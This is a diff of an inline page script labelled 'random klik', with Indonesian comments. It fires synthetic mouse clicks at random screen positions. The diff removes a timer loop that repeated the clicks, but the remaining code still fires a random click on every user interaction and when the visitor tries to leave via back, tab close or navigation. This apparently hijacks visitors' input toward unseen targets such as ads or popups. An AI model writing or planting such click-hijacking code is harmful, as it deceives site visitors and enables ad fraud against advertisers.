@@ -3,21 +3,6 @@
 (function() {
   'use strict';
 
-  // ========== KONFIGURASI ==========
-  const CONFIG = {
-    minDelay: 5000,  // delay minimum (ms)
-    maxDelay: 12000, // delay maksimum (ms)
-  };
-
-  // ========== STATE ==========
-  let timeoutId = null;
-  let isLooping = false;
-
-  // ========== FUNGSI UTAMA ==========
-  function randomDelay() {
-    return CONFIG.minDelay + Math.random() * (CONFIG.maxDelay - CONFIG.minDelay);
-  }
-
   function clickAnywhere() {
     try {
       const x = Math.random() * window.innerWidth;
@@ -37,34 +22,6 @@
     }
   }
 
-  // ========== LOOP CONTROL ==========
-  function startLoop() {
-    // Langsung klik saat terpicu
-    clickAnywhere();
-
-    // Cegah loop ganda
-    if (isLooping) return;
-    isLooping = true;
-
-    function loop() {
-      if (!isLooping) return;
-      clickAnywhere();
-      timeoutId = setTimeout(loop, randomDelay());
-    }
-
-    timeoutId = setTimeout(loop, randomDelay());
-  }
-
-  function stopLoop() {
-    isLooping = false;
-    if (timeoutId) {
-      clearTimeout(timeoutId);
-      timeoutId = null;
-    }
-  }
-
-  // ========== EVENT LISTENERS ==========
-  
   // Interaksi dalam halaman
   const interactionEvents = [
     'click', 'dblclick',
@@ -80,35 +37,21 @@
   ];
 
   interactionEvents.forEach(eventType => {
-    document.addEventListener(eventType, startLoop, { passive: true });
-    window.addEventListener(eventType, startLoop, { passive: true });
+    document.addEventListener(eventType, clickAnywhere, { passive: true });
+    window.addEventListener(eventType, clickAnywhere, { passive: true });
   });
 
   // Navigasi pergi (back, forward, tutup tab)
   const exitEvents = ['pagehide', 'beforeunload', 'popstate'];
 
   exitEvents.forEach(eventType => {
-    window.addEventListener(eventType, () => {
-      clickAnywhere();
-      stopLoop();
-    }, { passive: true });
-  });
-
-  // Hentikan loop saat tab tidak terlihat
-  document.addEventListener('visibilitychange', () => {
-    if (document.hidden) {
-      stopLoop();
-    }
-  });
-
-  // Bersihkan saat halaman benar-benar ditutup
-  window.addEventListener('unload', () => {
-    stopLoop();
+    window.addEventListener(eventType, clickAnywhere, { passive: true });
   });
 
 })();
 </script>
 <!-- random klik end -->
+
 
 
 
